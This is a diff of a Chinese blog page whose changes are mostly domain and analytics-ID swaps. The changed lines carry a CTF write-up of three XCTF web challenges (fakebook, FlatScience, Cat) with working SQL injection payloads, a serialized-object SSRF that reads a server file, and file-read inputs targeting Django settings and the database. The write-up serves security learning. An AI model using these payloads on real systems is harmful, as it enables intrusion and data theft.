@@ -16,15 +16,15 @@
     <title>CTF-攻防世界Web题目4 | P1n9</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
-    <link rel="stylesheet" type="text/css" href="https://image.12679.top/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="https://image.12679.top/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="https://image.12679.top/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="https://image.12679.top/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="https://image.12679.top/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://image.p1n9.cn/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="https://image.p1n9.cn/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://image.p1n9.cn/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://image.p1n9.cn/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://image.p1n9.cn/lightGallery/css/lightgallery.min.css">
     <link rel="stylesheet" type="text/css" href="/css/matery.css">
     <link rel="stylesheet" type="text/css" href="/css/my.css">
 
-    <script src="https://image.12679.top/jquery/jquery.min.js"></script>
+    <script src="https://image.p1n9.cn/jquery/jquery.min.js"></script>
     
 <meta name="generator" content="Hexo 5.2.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
@@ -285,7 +285,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://image.12679.top/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://image.p1n9.cn/featureimages/23.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -303,7 +303,7 @@
 <main class="post-container content">
 
     
-    <link rel="stylesheet" href="https://image.12679.top/tocbot/tocbot.css">
+    <link rel="stylesheet" href="https://image.p1n9.cn/tocbot/tocbot.css">
 <style>
     #articleContent h1::before,
     #articleContent h2::before,
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-04-14
+                    2021-12-15
                 </div>
                 
 
@@ -468,9 +468,9 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="一、fakebook"><a href="#一、fakebook" class="headerlink" title="一、fakebook"></a>一、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5425&amp;page=2">fakebook</a></h2><p><strong>题目：</strong><br><img src="http://image.12679.top/blog/23.1.png"></p>
+                <h2 id="一、fakebook"><a href="#一、fakebook" class="headerlink" title="一、fakebook"></a>一、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5425&amp;page=2">fakebook</a></h2><p><strong>题目：</strong><br><img src="https://image.p1n9.cn/blog/23.1.png"></p>
 <p><strong>大佬解题方法：</strong><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42196196/article/details/81952174">解网鼎杯一道web题（fakebook）</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11784487.html">BUUCTF |Fakebook</a>(博客样式很漂亮)<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2f60dbd68eb8">csrf以及ssrf</a></p>
-<p><strong>解题方法：</strong><br>1、自己上来也是查看了robots.txt，发现有文件，下载后<br><img src="http://image.12679.top/blog/23.2.png"></p>
+<p><strong>解题方法：</strong><br>1、自己上来也是查看了robots.txt，发现有文件，下载后<br><img src="https://image.p1n9.cn/blog/23.2.png"></p>
 <pre><code>&lt;?php
 
 class UserInfo
@@ -531,23 +531,23 @@ class UserInfo
 这个匹配空或者是：8521等类似的端口号
 (\/\S*)?:
 这个匹配/456(随便任意多个字符);</code></pre>
-<p>\s是指空白，包括空格、换行、tab缩进等所有的空白，而\S刚好相反<br>2、首先注册的时候，发现username那里存在post注入；<br>注册进去发现用户界面有get注入<br><img src="http://image.12679.top/blog/23.3.png"><br>no参数能够get注入，但是用sqlmap查不出数据库名；这里存在空格的过滤，正常的sql注入payload都返回错误，不带空格的返回正常；<br><strong>注意：</strong><br>对于存在空格过滤的sql注入，可以通过++替代，末尾加上–+；<br><code>/view.php?no=-1++union++select++1,group_concat(schema_name),3,4++from++information_schema.schemata--+</code><br>3、这时用username的post注入试一下<br><img src="http://image.12679.top/blog/23.4.png"><br>真的很有点慢，利用time注入，厉害的朋友可以自己写命令直接就出来了；<br><img src="http://image.12679.top/blog/23.5.png"><br>输入<code>sqlmap -r 1.txt --dump -tables</code><br><img src="http://image.12679.top/blog/23.6.png"><br>时间注入真的超慢，还是如果自己写最好自己写</p>
+<p>\s是指空白，包括空格、换行、tab缩进等所有的空白，而\S刚好相反<br>2、首先注册的时候，发现username那里存在post注入；<br>注册进去发现用户界面有get注入<br><img src="https://image.p1n9.cn/blog/23.3.png"><br>no参数能够get注入，但是用sqlmap查不出数据库名；这里存在空格的过滤，正常的sql注入payload都返回错误，不带空格的返回正常；<br><strong>注意：</strong><br>对于存在空格过滤的sql注入，可以通过++替代，末尾加上–+；<br><code>/view.php?no=-1++union++select++1,group_concat(schema_name),3,4++from++information_schema.schemata--+</code><br>3、这时用username的post注入试一下<br><img src="https://image.p1n9.cn/blog/23.4.png"><br>真的很有点慢，利用time注入，厉害的朋友可以自己写命令直接就出来了；<br><img src="https://image.p1n9.cn/blog/23.5.png"><br>输入<code>sqlmap -r 1.txt --dump -tables</code><br><img src="https://image.p1n9.cn/blog/23.6.png"><br>时间注入真的超慢，还是如果自己写最好自己写</p>
 <p>4、还可以通过fuzz测试：</p>
 <pre><code>爆表名 /view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#</code></pre>
-<p><img src="http://image.12679.top/blog/23.7.png"></p>
+<p><img src="https://image.p1n9.cn/blog/23.7.png"></p>
 <pre><code>爆列名 /view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name="users")),1)#</code></pre>
-<p><img src="http://image.12679.top/blog/23.8.png"></p>
+<p><img src="https://image.p1n9.cn/blog/23.8.png"></p>
 <pre><code>爆字段 
 /view.php?no=-1++union++select++1,group_concat(data),3,4++from++users--+
 这里是-1，专门让其报错，将信息返回</code></pre>
-<p><img src="http://image.12679.top/blog/23.9.png"></p>
+<p><img src="https://image.p1n9.cn/blog/23.9.png"></p>
 <pre><code>/view.php?no=489798++union++select++1,data,3,4++from++users--+</code></pre>
-<p><img src="http://image.12679.top/blog/23.10.png"></p>
+<p><img src="https://image.p1n9.cn/blog/23.10.png"></p>
 <p>5、可以利用这个序列化，直接用&nbsp;union select&nbsp;会被WAF检测到，所以使用&nbsp;/**/&nbsp;来绕过，反序列化字符串对应数据库data列放在第四列，注入后bolg栏显示file:///var/www/html/flag.php，代表注入成功</p>
 <pre><code>?no=0/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";i:1;s:3:"age";i:2;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' </code></pre>
-<p><img src="http://image.12679.top/blog/23.11.png"><br><img src="http://image.12679.top/blog/23.12.png"><br>6、得到flag<br><code>flag{c1e552fdf77049fabf65168f22f7aeab}</code></p>
-<h2 id="二、FlatScience"><a href="#二、FlatScience" class="headerlink" title="二、FlatScience"></a>二、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4809&amp;page=2">FlatScience</a></h2><p><strong>题目：</strong><br><img src="http://image.12679.top/blog/23.13.png"></p>
-<p><strong>解题方法：</strong><br>1、上来一个必要操作，就是看robots.txt隐藏信息，还有按f12调试查看源码，查看有没有提示信息；<br><img src="http://image.12679.top/blog/23.14.png"><br>2、接着打开发现两个界面<br><img src="http://image.12679.top/blog/23.15.png"><br><img src="http://image.12679.top/blog/23.16.png"><br>经测试login.php的usr存在注入，admin.php不存在注入，后台数据库为sqlite；<br>也可以通过sqlmap工具测试，一切输入地方和查询数据库有关，均可测注入；<br>3、对于每个页面都需要f12查看一下源码是否有泄漏信息，这里login.php有泄漏<br><img src="http://image.12679.top/blog/23.17.png"><br>url输入?debug，显示出login.php的源码</p>
+<p><img src="https://image.p1n9.cn/blog/23.11.png"><br><img src="https://image.p1n9.cn/blog/23.12.png"><br>6、得到flag<br><code>flag{c1e552fdf77049fabf65168f22f7aeab}</code></p>
+<h2 id="二、FlatScience"><a href="#二、FlatScience" class="headerlink" title="二、FlatScience"></a>二、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4809&amp;page=2">FlatScience</a></h2><p><strong>题目：</strong><br><img src="https://image.p1n9.cn/blog/23.13.png"></p>
+<p><strong>解题方法：</strong><br>1、上来一个必要操作，就是看robots.txt隐藏信息，还有按f12调试查看源码，查看有没有提示信息；<br><img src="https://image.p1n9.cn/blog/23.14.png"><br>2、接着打开发现两个界面<br><img src="https://image.p1n9.cn/blog/23.15.png"><br><img src="https://image.p1n9.cn/blog/23.16.png"><br>经测试login.php的usr存在注入，admin.php不存在注入，后台数据库为sqlite；<br>也可以通过sqlmap工具测试，一切输入地方和查询数据库有关，均可测注入；<br>3、对于每个页面都需要f12查看一下源码是否有泄漏信息，这里login.php有泄漏<br><img src="https://image.p1n9.cn/blog/23.17.png"><br>url输入?debug，显示出login.php的源码</p>
 <pre><code>
 &lt;?php
 ob_start();?&gt;&lt;!DOCTYPE&nbsp;HTML&nbsp;PUBLIC&nbsp;"-//W3C//DTD&nbsp;HTML&nbsp;4.01//EN"&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;blockquote&nbsp;{&nbsp;background:&nbsp;#eeeeee;&nbsp;}h1&nbsp;{&nbsp;border-bottom:&nbsp;solid&nbsp;black&nbsp;2px;&nbsp;}h2&nbsp;{&nbsp;border-bottom:&nbsp;solid&nbsp;black&nbsp;1px;&nbsp;}.comment&nbsp;{&nbsp;color:&nbsp;darkgreen;&nbsp;}&lt;/style&gt;&lt;meta&nbsp;http-equiv="Content-Type"&nbsp;content="text/html;&nbsp;charset=iso-8859-1"&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div&nbsp;align=right&nbsp;class=lastmod&gt;Last&nbsp;Modified:&nbsp;Fri&nbsp;Mar&nbsp;&nbsp;31:33:7&nbsp;UTC&nbsp;1337&lt;/div&gt;&lt;h1&gt;Login&lt;/h1&gt;Login&nbsp;Page,&nbsp;do&nbsp;not&nbsp;try&nbsp;to&nbsp;hax&nbsp;here&nbsp;plox!&lt;br&gt;&lt;form&nbsp;method="post"&gt;&nbsp;&nbsp;ID:&lt;br&gt;&nbsp;&nbsp;&lt;input&nbsp;type="text"&nbsp;name="usr"&gt;&nbsp;&nbsp;&lt;br&gt;&nbsp;&nbsp;Password:&lt;br&gt;&nbsp;&nbsp;&nbsp;&lt;input&nbsp;type="text"&nbsp;name="pw"&gt;&nbsp;&nbsp;&lt;br&gt;&lt;br&gt;&nbsp;&nbsp;&lt;input&nbsp;type="submit"&nbsp;value="Submit"&gt;&lt;/form&gt;&lt;?phpif(isset($_POST['usr'])&nbsp;&amp;&amp;&nbsp;isset($_POST['pw'])){
@@ -570,14 +570,14 @@ ob_start();?&gt;&lt;!DOCTYPE&nbsp;HTML&nbsp;PUBLIC&nbsp;"-//W3C//DTD&nbsp;HTML&n
 }
 if(isset($_GET['debug']))highlight_file('login.php');?&gt;
 &lt;!--&nbsp;TODO:&nbsp;Remove&nbsp;?debug-Parameter!&nbsp;--&gt;&lt;hr&nbsp;noshade&gt;&lt;address&gt;Flux&nbsp;Horst&nbsp;(Flux&nbsp;dot&nbsp;Horst&nbsp;at&nbsp;rub&nbsp;dot&nbsp;flux)&lt;/address&gt;&lt;/body&gt;</code></pre>
-<p>这样可以得到表名，密码如何加密等等信息，密码通过pass+Salz!，之后sha1加密存储数据库；<br>4、用burp捕获报文，构造payload：<code>usr=' union select name,sql from sqlite_master--+&amp;pw=</code><br>为什么要查询sql呢，这涉及到sqlite自带的结构表sqlite_master，sql是sqlite_master中的一个字段，注入时经常用到的，注入后响应头的set-cookie：<br><img src="http://image.12679.top/blog/23.18.png"><br>set-cookie信息：</p>
+<p>这样可以得到表名，密码如何加密等等信息，密码通过pass+Salz!，之后sha1加密存储数据库；<br>4、用burp捕获报文，构造payload：<code>usr=' union select name,sql from sqlite_master--+&amp;pw=</code><br>为什么要查询sql呢，这涉及到sqlite自带的结构表sqlite_master，sql是sqlite_master中的一个字段，注入时经常用到的，注入后响应头的set-cookie：<br><img src="https://image.p1n9.cn/blog/23.18.png"><br>set-cookie信息：</p>
 <pre><code>CREATE TABLE Users(
     id int primary key,
     name varchar(255),
     password varchar(255),
     hint varchar(255)
 )</code></pre>
-<p>5、由于sqlmap查不出sqlite数据库，一直出错，所以构造payload：<br><code>usr=' UNION SELECT id, id from Users limit 0,1--+&amp;pw=123</code><br><img src="http://image.12679.top/blog/23.19.png"><br><code>usr=' UNION SELECT id, name from Users limit 0,1--+&amp;pw=123</code><br><img src="http://image.12679.top/blog/23.20.png"><br><code>usr=' UNION SELECT id, password from Users limit 0,1--+&amp;pw=123</code><br><img src="http://image.12679.top/blog/23.21.png"><br><code>usr=' UNION SELECT id, hint from Users limit 0,1--+&amp;pw=123</code><br><img src="http://image.12679.top/blog/23.22.png"><br>得出结果：</p>
+<p>5、由于sqlmap查不出sqlite数据库，一直出错，所以构造payload：<br><code>usr=' UNION SELECT id, id from Users limit 0,1--+&amp;pw=123</code><br><img src="https://image.p1n9.cn/blog/23.19.png"><br><code>usr=' UNION SELECT id, name from Users limit 0,1--+&amp;pw=123</code><br><img src="https://image.p1n9.cn/blog/23.20.png"><br><code>usr=' UNION SELECT id, password from Users limit 0,1--+&amp;pw=123</code><br><img src="https://image.p1n9.cn/blog/23.21.png"><br><code>usr=' UNION SELECT id, hint from Users limit 0,1--+&amp;pw=123</code><br><img src="https://image.p1n9.cn/blog/23.22.png"><br>得出结果：</p>
 <pre><code>admin 3fab54a50e770d830c0416df817567662a9dc85c +my+fav+word+in+my+fav+paper?!</code></pre>
 <p>可以看出仍然需要破解密码，看到hint提示，我的word在paper里，看了大佬的推测，可能在pdf里，hhh，如果是我的话，可能就停在这一步了，没那么活泛的思维；<br>大佬脚本，pdf查找：</p>
 <pre><code>from cStringIO import StringIO
@@ -621,11 +621,11 @@ def find_password():
 
 if __name__ == "__main__":
     find_password()</code></pre>
-<p>6、我也懒得跑了，这道题耗费时间过多，没心思了，admin密码是ThinJerboa<br><img src="http://image.12679.top/blog/23.23.png"></p>
-<h2 id="三、Cat"><a href="#三、Cat" class="headerlink" title="三、Cat"></a>三、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4658">Cat</a></h2><p><strong>题目：</strong><br><img src="http://image.12679.top/blog/23.24.png"></p>
+<p>6、我也懒得跑了，这道题耗费时间过多，没心思了，admin密码是ThinJerboa<br><img src="https://image.p1n9.cn/blog/23.23.png"></p>
+<h2 id="三、Cat"><a href="#三、Cat" class="headerlink" title="三、Cat"></a>三、<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4658">Cat</a></h2><p><strong>题目：</strong><br><img src="https://image.p1n9.cn/blog/23.24.png"></p>
 <p><strong>解题相关链接：</strong><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/JBlock/article/details/88619117">WFUZZ使用教程</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/JBlock/article/details/88624657?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">大话FUZZ测试</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/JBlock/article/details/88311388?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">CTF命令执行及绕过技巧</a><br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018748071">【CTF】利用 Burpsuite Fuzz 实现 SQL 注入</a></p>
-<p><strong>解题方法：</strong><br>1、看到题目界面，先输入一个域名baidu.com试试，发现没反应；输入sql注入，发现返回Invalid url；<br><img src="http://image.12679.top/blog/23.25.png"><br>2、这时候真不知道怎么办了，然后查题解发现这里有命令执行，输入127.0.0.1；<br><img src="http://image.12679.top/blog/23.26.png"><br>之后测试命令执行漏洞，试了很多组合都不可以，均返回invalid url；<br>3、对id参数进行fuzz测试<br>用burpsuite的Intruder模块进行fuzz测试；<br><img src="http://image.12679.top/blog/23.27.png"><br>发现有错误提示<br><img src="http://image.12679.top/blog/23.28.png"><br>4、将代码用浏览器打开<br><img src="http://image.12679.top/blog/23.29.png"><br>发现是django后台的报错<br>有许多敏感信息<img src="http://image.12679.top/blog/23.30.png"></p>
-<p>5、其实这道题原题是有提示的<br><img src="http://image.12679.top/blog/23.31.png"><br>6、结合django的报错得知了项目的绝对路径为/opt/api<br>django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。读取settings.py文件，这里需要注意django项目生成时settings.py会存放在以项目目录下再以项目名称命名的文件夹下面。<br>输入url：<code>id=@/opt/api/api/settings.py</code><br><img src="http://image.12679.top/blog/23.32.png"><br><img src="http://image.12679.top/blog/23.33.png"><br>7、输入<code>id=@/opt/api/database.sqlite3</code>,之后用ctrl+f搜索ctf<br><img src="http://image.12679.top/blog/23.34.png"><br>8、得到flag</p>
+<p><strong>解题方法：</strong><br>1、看到题目界面，先输入一个域名baidu.com试试，发现没反应；输入sql注入，发现返回Invalid url；<br><img src="https://image.p1n9.cn/blog/23.25.png"><br>2、这时候真不知道怎么办了，然后查题解发现这里有命令执行，输入127.0.0.1；<br><img src="https://image.p1n9.cn/blog/23.26.png"><br>之后测试命令执行漏洞，试了很多组合都不可以，均返回invalid url；<br>3、对id参数进行fuzz测试<br>用burpsuite的Intruder模块进行fuzz测试；<br><img src="https://image.p1n9.cn/blog/23.27.png"><br>发现有错误提示<br><img src="https://image.p1n9.cn/blog/23.28.png"><br>4、将代码用浏览器打开<br><img src="https://image.p1n9.cn/blog/23.29.png"><br>发现是django后台的报错<br>有许多敏感信息<img src="https://image.p1n9.cn/blog/23.30.png"></p>
+<p>5、其实这道题原题是有提示的<br><img src="https://image.p1n9.cn/blog/23.31.png"><br>6、结合django的报错得知了项目的绝对路径为/opt/api<br>django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库），如果使用的是其它数据库的话settings.py则设置用户名和密码。除此外settings.py还会对项目整体的设置进行定义。读取settings.py文件，这里需要注意django项目生成时settings.py会存放在以项目目录下再以项目名称命名的文件夹下面。<br>输入url：<code>id=@/opt/api/api/settings.py</code><br><img src="https://image.p1n9.cn/blog/23.32.png"><br><img src="https://image.p1n9.cn/blog/23.33.png"><br>7、输入<code>id=@/opt/api/database.sqlite3</code>,之后用ctrl+f搜索ctf<br><img src="https://image.p1n9.cn/blog/23.34.png"><br>8、得到flag</p>
 
             </div>
             <hr/>
@@ -641,7 +641,7 @@ if __name__ == "__main__":
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://12679.top" rel="external nofollow noreferrer">P1n9</a>
+                    <a href="http://p1n9.cn" rel="external nofollow noreferrer">P1n9</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -651,7 +651,7 @@ if __name__ == "__main__":
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://12679.top/2020/04/14/23/">http://12679.top/2020/04/14/23/</a>
+                    <a href="http://p1n9.cn/2020/04/14/23/">http://p1n9.cn/2020/04/14/23/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -664,7 +664,7 @@ if __name__ == "__main__":
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="http://12679.top" target="_blank">P1n9</a>
+                    <a href="http://p1n9.cn" target="_blank">P1n9</a>
                     !
                 </span>
             </div>
@@ -972,12 +972,12 @@ if __name__ == "__main__":
 </div>
 
 <script src="/libs/valine/av-min.js"></script>
-<script src="https://image.12679.top/valine/Valine.min.js"></script>
+<script src="https://image.p1n9.cn/valine/Valine.min.js"></script>
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'I3wOlp7afLKRV583imHzIju3-gzGzoHsz',
-        appKey: 'WKVJsARrWKVFK0wdDoInKM71',
+        appId: 'AyuymwyNaLFfImI9Q3TNPVAN-gzGzoHsz',
+        appKey: 'xx1nOrSBta51mL5WB1exTdOs',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
         visitor: 'true' === 'true',
@@ -1003,7 +1003,7 @@ if __name__ == "__main__":
                     <div class="card-image">
                         
                         
-                        <img src="https://image.12679.top/featureimages/21.jpg" class="responsive-img" alt="扬帆起航">
+                        <img src="https://image.p1n9.cn/featureimages/21.jpg" class="responsive-img" alt="扬帆起航">
                         
                         <span class="card-title">扬帆起航</span>
                     </div>
@@ -1048,7 +1048,7 @@ if __name__ == "__main__":
                     <div class="card-image">
                         
                         
-                        <img src="https://image.12679.top/featureimages/22.jpg" class="responsive-img" alt="CTF-攻防世界Web题目3">
+                        <img src="https://image.p1n9.cn/featureimages/22.jpg" class="responsive-img" alt="CTF-攻防世界Web题目3">
                         
                         <span class="card-title">CTF-攻防世界Web题目3</span>
                     </div>
@@ -1180,7 +1180,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
 </div>
 
 
-<script src="https://image.12679.top/tocbot/tocbot.min.js"></script>
+<script src="https://image.p1n9.cn/tocbot/tocbot.min.js"></script>
 <script>
     $(function () {
         tocbot.init({
@@ -1268,11 +1268,11 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             <span id="year">2020</span>
-            <a href="http://12679.top" target="_blank">P1n9</a>
+            <a href="http://p1n9.cn" target="_blank">P1n9</a>
 			&nbsp;&nbsp;
             
             <span id="icp"><img src="/medias/icp.png" style="vertical-align: text-bottom;" />
-                <a href="http://www.beian.miit.gov.cn" target="_blank">晋ICP备20001718号-1</a>
+                <a href="http://www.beian.miit.gov.cn" target="_blank">晋ICP备20001718号-2</a>
             </span>
             
 			<br>
@@ -1407,16 +1407,16 @@ $(function () {
 </div>
 
 
-    <script src="https://image.12679.top/materialize/materialize.min.js"></script>
-    <script src="https://image.12679.top/masonry/masonry.pkgd.min.js"></script>
-    <script src="https://image.12679.top/aos/aos.js"></script>
-    <script src="https://image.12679.top/scrollprogress/scrollProgress.min.js"></script>
-    <script src="https://image.12679.top/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="https://image.p1n9.cn/materialize/materialize.min.js"></script>
+    <script src="https://image.p1n9.cn/masonry/masonry.pkgd.min.js"></script>
+    <script src="https://image.p1n9.cn/aos/aos.js"></script>
+    <script src="https://image.p1n9.cn/scrollprogress/scrollProgress.min.js"></script>
+    <script src="https://image.p1n9.cn/lightGallery/js/lightgallery-all.min.js"></script>
     <script src="/js/matery.js"></script>
 
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-161839843-1"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-LXJ93MF8W5"></script>
 <script>
     window.dataLayer = window.dataLayer || [];
     function gtag() {
@@ -1424,7 +1424,7 @@ $(function () {
     }
 
     gtag('js', new Date());
-    gtag('config', 'UA-161839843-1');
+    gtag('config', 'G-LXJ93MF8W5');
 </script>
 
 
@@ -1434,7 +1434,7 @@ $(function () {
     var _hmt = _hmt || [];
     (function () {
         var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?7fc02ada382f9c86da55ef7e31ca60f8";
+        hm.src = "https://hm.baidu.com/hm.js?e1b8c0884f83ab30bdc4fb0fcd4c7b44";
         var s = document.getElementsByTagName("script")[0];
         s.parentNode.insertBefore(hm, s);
     })();
@@ -1457,10 +1457,10 @@ $(function () {
 </script>
 
     
-    <script src="https://image.12679.top/others/clicklove.js" async="async"></script>
+    <script src="https://image.p1n9.cn/others/clicklove.js" async="async"></script>
     
     
-    <script async src="https://image.12679.top/others/busuanzi.pure.mini.js"></script>
+    <script async src="https://image.p1n9.cn/others/busuanzi.pure.mini.js"></script>
     
 
     
@@ -1471,17 +1471,17 @@ $(function () {
     <script type="text/javascript" color="0,0,255"
         pointColor="0,0,255" opacity='0.7'
         zIndex="-1" count="99"
-        src="https://image.12679.top/background/canvas-nest.js"></script>
+        src="https://image.p1n9.cn/background/canvas-nest.js"></script>
     
 
     
 
     
-    <script type="text/javascript" src="https://image.12679.top/background/ribbon-dynamic.js" async="async"></script>
+    <script type="text/javascript" src="https://image.p1n9.cn/background/ribbon-dynamic.js" async="async"></script>
     
     
     
-    <script src="https://image.12679.top/instantpage/instantpage.js" type="module"></script>
+    <script src="https://image.p1n9.cn/instantpage/instantpage.js" type="module"></script>
     
 	
 	<!-- 页面点击特效 -->
